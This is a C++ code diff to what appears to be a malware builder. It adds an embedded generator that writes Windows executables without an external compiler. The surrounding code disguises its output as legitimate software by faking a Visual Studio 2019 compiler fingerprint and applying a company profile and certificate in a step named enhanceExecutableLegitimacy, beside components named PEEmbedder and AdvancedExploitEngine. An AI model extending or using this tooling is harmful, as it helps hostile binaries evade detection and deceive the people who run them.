@@ -1299,6 +1299,7 @@ public:
     DNARandomizer dnaRandomizer;
     PEEmbedder peEmbedder;
     AdvancedExploitEngine exploitEngine;
+    EmbeddedCompiler embeddedCompiler;
     
     struct CompanyProfile {
         std::string name;
@@ -1571,7 +1572,22 @@ public:
             // Get compiler fingerprint
             auto compilerFingerprint = compilerMasq.generateVS2019Fingerprint();
             
-            // Build compilation command with architecture support
+            // 🚀 FIRST: Try embedded PE compiler (no external dependencies!)
+            {
+                auto embeddedResult = embeddedCompiler.createSelfContainedExecutable(benignCode, outputPath);
+                if (embeddedResult.success) {
+                    // Clean up temporary file
+                    DeleteFileA(tempSource.c_str());
+                    
+                    // Post-process the executable for additional legitimacy
+                    enhanceExecutableLegitimacy(outputPath, company, cert, compilerFingerprint, architecture);
+                    
+                    return true; // ✅ Success with embedded compiler!
+                }
+                // If embedded compiler failed, continue with external compiler fallback
+            }
+            
+            // Build compilation command with architecture support (fallback)
             std::string archFlags = multiArch.getCompilerFlags(architecture);
             
             std::string compileCmd;
@@ -2381,8 +2397,8 @@ exit /b 1
         result.success = false;
         result.outputPath = outputPath;
         
-        // For ultimate portability, we can embed a minimal PE generator
-        // This creates a valid Windows executable directly from our C++ code
+        // For ultimate portability, we use an embedded PE generator
+        // This creates a valid Windows executable directly from our C++ code without external tools
         
         std::vector<uint8_t> executableData = generateMinimalPEExecutable(sourceCode);
         
@@ -2392,12 +2408,25 @@ exit /b 1
                 exeFile.write(reinterpret_cast<const char*>(executableData.data()), executableData.size());
                 exeFile.close();
                 result.success = true;
-                result.errorMessage = "Self-contained executable created successfully";
+                result.errorMessage = "✅ Self-contained PE executable created successfully (no external compiler needed!)";
+                
+                // Verify the file was created
+                DWORD attrs = GetFileAttributesA(outputPath.c_str());
+                if (attrs != INVALID_FILE_ATTRIBUTES) {
+                    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
+                    if (GetFileAttributesExA(outputPath.c_str(), GetFileExInfoStandard, &fileInfo)) {
+                        ULARGE_INTEGER fileSize;
+                        fileSize.LowPart = fileInfo.nFileSizeLow;
+                        fileSize.HighPart = fileInfo.nFileSizeHigh;
+                        result.errorMessage += " (Size: " + std::to_string(fileSize.QuadPart) + " bytes)";
+                    }
+                }
             } else {
-                result.errorMessage = "Failed to write executable file";
+                result.errorMessage = "❌ Failed to write executable file";
             }
         } else {
             // Fallback to regular compilation
+            result.errorMessage = "🔄 Internal PE generator failed, trying external compiler...";
             return compileToExecutable(sourceCode, outputPath);
         }
         
